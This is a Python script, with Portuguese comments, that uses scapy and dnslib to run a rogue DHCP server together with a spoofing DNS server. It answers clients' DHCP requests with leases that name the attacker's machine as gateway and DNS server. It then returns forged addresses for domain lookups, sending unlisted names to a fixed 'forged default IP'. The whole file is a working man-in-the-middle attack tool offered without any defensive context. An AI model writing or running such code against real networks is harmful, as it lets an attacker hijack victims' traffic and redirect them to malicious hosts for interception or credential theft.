from scapy.all import *
import socket
import threading
from dnslib import DNSRecord, DNSHeader, DNSQuestion, RR, QTYPE, A
import random
import time
import os

print(f"Interface: {conf.iface}")


# Função para capturar pacotes DHCP Discover e Request
def dhcp_sniffer():
    def handle_packet(packet):
        if DHCP in packet and packet[DHCP].options[0][1] == 1:
            print(f"DHCP Discover from {packet[Ether].src}")
            send_dhcp_offer(packet)
        elif DHCP in packet and packet[DHCP].options[0][1] == 3:
            print(f"DHCP Request from {packet[Ether].src}")
            send_dhcp_ack(packet)
        else:
            print("Received packet:", packet.summary())

    sniff(filter="udp and (port 67 or port 68)", prn=handle_packet, store=0)

# Variáveis de controle de IPs alocados
allocated_ips = {}
subnet = '10.32.143.'

# Função para enviar DHCP Offer
def send_dhcp_offer(packet):
    transaction_id = packet[BOOTP].xid
    client_mac = packet[Ether].src
    yiaddr = allocate_ip(client_mac)

    ether = Ether(dst=client_mac, src=get_if_hwaddr(conf.iface))
    ip = IP(src='10.32.143.21', dst='255.255.255.255')
    udp = UDP(sport=67, dport=68)
    bootp = BOOTP(op=2, yiaddr=yiaddr, siaddr='10.32.143.21', chaddr=packet[BOOTP].chaddr, xid=transaction_id)
    dhcp = DHCP(options=[('message-type', 'offer'), ('server_id', '10.32.143.21'), ('lease_time', 600), ('subnet_mask', '255.255.255.0'), ('router', '10.32.143.21'), ('name_server', '10.32.143.21'), ('end')])
    offer_packet = ether / ip / udp / bootp / dhcp
    sendp(offer_packet)
    print(f"Sent DHCP Offer to {client_mac}")

# Função para enviar DHCP Ack
def send_dhcp_ack(packet):
    transaction_id = packet[BOOTP].xid
    client_mac = packet[Ether].src
    yiaddr = allocated_ips.get(client_mac) or allocate_ip(client_mac)

    ether = Ether(dst=client_mac, src=get_if_hwaddr(conf.iface))
    ip = IP(src='10.32.143.21', dst='255.255.255.255')
    udp = UDP(sport=67, dport=68)
    bootp = BOOTP(op=2, yiaddr=yiaddr, siaddr='10.32.143.21', chaddr=packet[BOOTP].chaddr, xid=transaction_id)
    dhcp = DHCP(options=[('message-type', 'ack'), ('server_id', '10.32.143.21'), ('lease_time', 600), ('subnet_mask', '255.255.255.0'), ('router', '10.32.143.21'), ('name_server', '10.32.143.21'), ('end')])
    ack_packet = ether / ip / udp / bootp / dhcp
    sendp(ack_packet)
    print(f"Sent DHCP Ack to {client_mac} with IP {yiaddr}")


# Função para alocar IP dinâmico
def allocate_ip(client_mac):
    if client_mac in allocated_ips:
        return allocated_ips[client_mac]
    else:
        for i in range(100, 200):
            ip = subnet + str(i)
            if ip not in allocated_ips.values():
                allocated_ips[client_mac] = ip
                return ip

# Thread para executar o sniffer
dhcp_thread = threading.Thread(target=dhcp_sniffer)
dhcp_thread.start()

# Função para iniciar o servidor DNS
def start_dns_server():
    def handle_dns_request(data, addr):
        request = DNSRecord.parse(data)
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
        qname = str(request.q.qname)
        qtype = request.q.qtype
        if qtype == QTYPE.A:
            if qname in dns_spoof_table:
                reply.add_answer(RR(qname, rdata=A(dns_spoof_table[qname]), ttl=300))
            else:
                reply.add_answer(RR(qname, rdata=A('192.168.1.105'), ttl=300))  # IP padrão forjado
        sock.sendto(reply.pack(), addr)
        print(f"DNS request for {qname} from {addr}, responded with {dns_spoof_table.get(qname, '192.168.1.105')}")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', 53))
    while True:
        data, addr = sock.recvfrom(512)
        threading.Thread(target=handle_dns_request, args=(data, addr)).start()

# Tabela de spoofing DNS
dns_spoof_table = {
    'example.com.': '192.168.1.200',
    'anotherexample.com.': '192.168.1.201'
}

# Thread para executar o servidor DNS
dns_thread = threading.Thread(target=start_dns_server)
dns_thread.start()

# Função para exibir informações de controle
def display_control_info():
    while True:
        print("DHCP e DNS Spoofing em execução...")
        print(f"IPs Alocados: {allocated_ips}")
        time.sleep(1)

# Thread para exibir informações de controle
info_thread = threading.Thread(target=display_control_info)
info_thread.start()
